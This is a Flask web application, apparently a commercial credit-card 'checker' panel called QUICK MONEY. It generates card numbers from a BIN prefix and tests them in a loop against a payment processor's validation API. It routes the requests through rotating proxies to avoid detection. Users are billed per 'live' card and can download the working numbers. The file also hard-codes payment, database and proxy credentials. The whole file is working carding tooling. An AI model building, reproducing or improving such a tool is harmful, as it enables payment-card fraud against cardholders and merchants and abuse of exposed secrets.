import os, random, time, json, requests, base64
from flask import Flask, render_template_string, request, redirect, session, url_for, jsonify
from pymongo import MongoClient

app = Flask(__name__)
app.secret_key = 'quick_money_v35_full_control'

# --- CONFIGURACIÓN MAESTRA ---
SNIPCART_SECRET = "ST_MDM2YTJlNjItNjBmYi00N2IyLWFjYWMtNDBkYjZmN2M2ODUzNjM5MDkwMzU3MzkyMjQ1NjA3"
MONGO_URI = "mongodb+srv://mairo:mairo1212@cluster0.inuth4k.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"

# --- PROXIES DECODO ---
PROXY_USER = 'sp6jzqtaou'
PROXY_PASS = 'rUd7t65FxkK+x3Flhr'
PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@gate.decodo.com:10001"
PROXIES_CONFIG = {'http': PROXY_URL, 'https': PROXY_URL}

try:
    client = MongoClient(MONGO_URI)
    db_mongo = client['quickmoney_db']
    usuarios_col = db_mongo['usuarios']
except Exception as e:
    print(f"Error: {e}")

COSTO_LIVE = 0.15

# --- MOTOR DE VALIDACIÓN REAL ---
def check_gate_pro(cc):
    try:
        partes = cc.split('|')
        if len(partes) < 4: return {"status": "DEAD", "msg": "FORMATO INVÁLIDO"}
        num, mes, ano, cvv = partes[0], partes[1], partes[2], partes[3]

        auth_str = base64.b64encode(f"{SNIPCART_SECRET}:".encode()).decode()
        headers = {"Authorization": f"Basic {auth_str}", "Content-Type": "application/json"}
        payload = {"paymentMethod": "CreditCard", "card": {"number": num, "expiryMonth": int(mes), "expiryYear": int(ano), "cvv": cvv}}

        # Petición Real con Proxy Decodo
        response = requests.post('https://app.snipcart.com/api/paymentmethods/validate', json=payload, headers=headers, proxies=PROXIES_CONFIG, timeout=10)

        if response.status_code == 200:
            return {"status": "LIVE", "msg": "AUTHORIZED"}
        else:
            error_msg = response.json().get('message', 'DECLINED').upper()
            return {"status": "DEAD", "msg": error_msg}
    except:
        return {"status": "DEAD", "msg": "GATE ERROR"}

CSS = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&display=swap');
    :root { --gold: #c5a059; --bg: #000; --card: rgba(8, 8, 10, 0.95); --border: #1a1a1e; --green: #2ecc71; --red: #ff4757; }
    body { background: var(--bg); color: #fff; font-family: 'JetBrains Mono', monospace; margin: 0; padding: 10px; min-height: 100vh; }
    .container { max-width: 500px; margin: auto; padding-bottom: 50px; }
    .card { background: var(--card); border: 1px solid var(--border); border-radius: 4px; padding: 20px; margin-bottom: 15px; }
    .card-h { font-size: 11px; color: var(--gold); text-transform: uppercase; font-weight: bold; border-bottom: 1px solid var(--border); padding-bottom: 10px; margin-bottom: 15px; display: block; }
    input, textarea { width: 100%; background: #000; border: 1px solid var(--border); color: #fff; padding: 15px; margin-bottom: 10px; box-sizing: border-box; font-family: inherit; font-size: 12px; }
    .btn { border: none; padding: 15px; border-radius: 2px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 10px; width: 100%; margin-top: 5px; font-family: inherit; }
    .btn-gold { background: var(--gold); color: #000; }
    .btn-dark { background: #111; color: #fff; border: 1px solid #222; }
    .btn-mini { padding: 5px 10px; width: auto; font-size: 9px; margin-bottom: 5px; }
    .res-box { border-radius: 2px; padding: 12px; font-size: 11px; min-height: 100px; border: 1px solid #1a1a1e; background: #030303; overflow-y: auto; max-height: 250px; }
    .live-item { border-bottom: 1px solid #111; padding: 8px 0; color: var(--green); }
</style>
"""

@app.route('/')
def login():
    return render_template_string(f'<html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head><body style="display:flex;align-items:center;justify-content:center;height:100vh;"><div class="card" style="width:320px; text-align:center;"><h2>QUICK MONEY</h2><form method="POST" action="/auth"><input name="u" placeholder="USUARIO"><input type="password" name="p" placeholder="PASS"><button class="btn btn-gold">INGRESAR</button></form></div></body></html>')

@app.route('/panel', methods=['GET', 'POST'])
def panel():
    if 'user' not in session: return redirect(url_for('login'))
    u_data = usuarios_col.find_one({"u": session['user']})
    display_id = "ADMIN" if session['user'].lower() == "mairo" else session['user'].upper()
    
    gen_res = ""
    if request.method == 'POST' and 'bin' in request.form:
        raw_bin = request.form.get('bin', '').split('|')[0]
        cards = [f"{raw_bin}{''.join([str(random.randint(0,9)) for _ in range(16-len(raw_bin))])}|{random.randint(1,12):02d}|{random.randint(2025,2030)}|{random.randint(100,999)}" for _ in range(int(request.form.get('cant', 10)))]
        gen_res = "\\n".join(cards)

    return render_template_string(f"""
    <html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head>
    <body><div class="container">
        <div style="display:flex; justify-content:space-between; margin: 20px 0;">
            <div style="font-size:11px;">ID: <b style="color:var(--gold)">{display_id}</b></div>
            <div id="display_saldo" style="color:var(--gold); font-weight:bold;">${u_data['saldo']:.2f}</div>
        </div>
        
        <div class="card"><span class="card-h">🪄 GENERADOR</span>
            <form method="POST">
                <input name="bin" placeholder="BIN" value="{request.form.get('bin', '')}">
                <input name="cant" type="number" value="10">
                <button type="submit" class="btn btn-dark">GENERAR</button>
            </form>
            <textarea id="gen_area" rows="3" readonly style="margin-top:10px; font-size:10px; color:#888;">{gen_res}</textarea>
            <div style="display:flex; gap:5px;">
                <button class="btn btn-dark btn-mini" onclick="document.getElementById('check_list').value += document.getElementById('gen_area').value + '\\n'">➕ CARGAR</button>
                <button class="btn btn-dark btn-mini" onclick="document.getElementById('gen_area').value = ''">🗑️ BORRAR</button>
            </div>
        </div>

        <div class="card"><span class="card-h">🛡️ GATE PRO (NO COOKIES)</span>
            <textarea id="check_list" rows="5" placeholder="LISTA CC|MM|YY|CVV"></textarea>
            <button class="btn btn-gold" id="btn_start" onclick="startChecking()">🚀 INICIAR ($0.15)</button>
        </div>

        <div style="display:flex; justify-content:space-between; align-items:center;">
            <span style="color:var(--green); font-size:10px;">LIVES ✅</span>
            <button class="btn btn-dark btn-mini" onclick="downloadLives()">📥 DESCARGAR LIVES</button>
        </div>
        <div class="res-box" id="lives_log"></div>
        
        <div style="display:flex; justify-content:space-between; align-items:center; margin-top:15px;">
            <span style="color:var(--red); font-size:10px;">RECHAZADAS ❌</span>
            <button class="btn btn-dark btn-mini" onclick="document.getElementById('dead_log').innerHTML=''">🗑️ BORRAR</button>
        </div>
        <div class="res-box" id="dead_log" style="opacity:0.5;"></div>
    </div>

    <script>
    function playBeep() {{
        const context = new (window.AudioContext || window.webkitAudioContext)();
        const osc = context.createOscillator();
        const gain = context.createGain();
        osc.connect(gain); gain.connect(context.destination);
        osc.type = 'sine'; osc.frequency.setValueAtTime(880, context.currentTime);
        gain.gain.setValueAtTime(0.1, context.currentTime);
        osc.start(); osc.stop(context.currentTime + 0.2);
    }}

    function downloadLives() {{
        let data = document.getElementById('lives_log').innerText;
        if(!data) return alert("No hay lives para descargar");
        let blob = new Blob([data], {{type: 'text/plain'}});
        let a = document.createElement('a');
        a.href = URL.createObjectURL(blob); a.download = 'lives_quickmoney.txt'; a.click();
    }}

    async function startChecking() {{
        let area = document.getElementById('check_list'); let lines = area.value.trim().split('\\n');
        if(!lines[0]) return;
        document.getElementById('btn_start').disabled = true;
        while(lines.length > 0) {{
            let cc = lines.shift(); area.value = lines.join('\\n');
            let res = await fetch('/validar_card', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{card:cc}})}});
            let data = await res.json();
            if(data.status === 'insufficient') break;
            if(data.status === 'LIVE') {{
                playBeep();
                document.getElementById('display_saldo').innerText = '$' + data.nuevo_saldo.toFixed(2);
                document.getElementById('lives_log').innerHTML = '<div class="live-item">'+cc+' | '+data.msg+'</div>' + document.getElementById('lives_log').innerHTML;
            }} else {{
                document.getElementById('dead_log').innerHTML = cc + ' | ' + data.msg + '<br>' + document.getElementById('dead_log').innerHTML;
            }}
            await new Promise(r => setTimeout(r, 1200));
        }}
        document.getElementById('btn_start').disabled = false;
    }}
    </script></body></html>
    """)

@app.route('/auth', methods=['POST'])
def auth():
    u, p = request.form.get('u'), request.form.get('p')
    if usuarios_col.find_one({"u": u, "p": p}): session['user'] = u
    return redirect(url_for('panel'))

@app.route('/validar_card', methods=['POST'])
def validar():
    u_data = usuarios_col.find_one({"u": session['user']})
    if u_data['saldo'] < COSTO_LIVE: return jsonify({"status":"insufficient"})
    cc = request.json.get('card', '')
    res = check_gate_pro(cc)
    if res['status'] == 'LIVE':
        new_s = round(u_data['saldo'] - COSTO_LIVE, 2)
        usuarios_col.update_one({"u": session['user']}, {"$set": {"saldo": new_s}})
        return jsonify({"status": "LIVE", "nuevo_saldo": new_s, "msg": res['msg']})
    return jsonify({"status": "DEAD", "msg": res['msg']})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
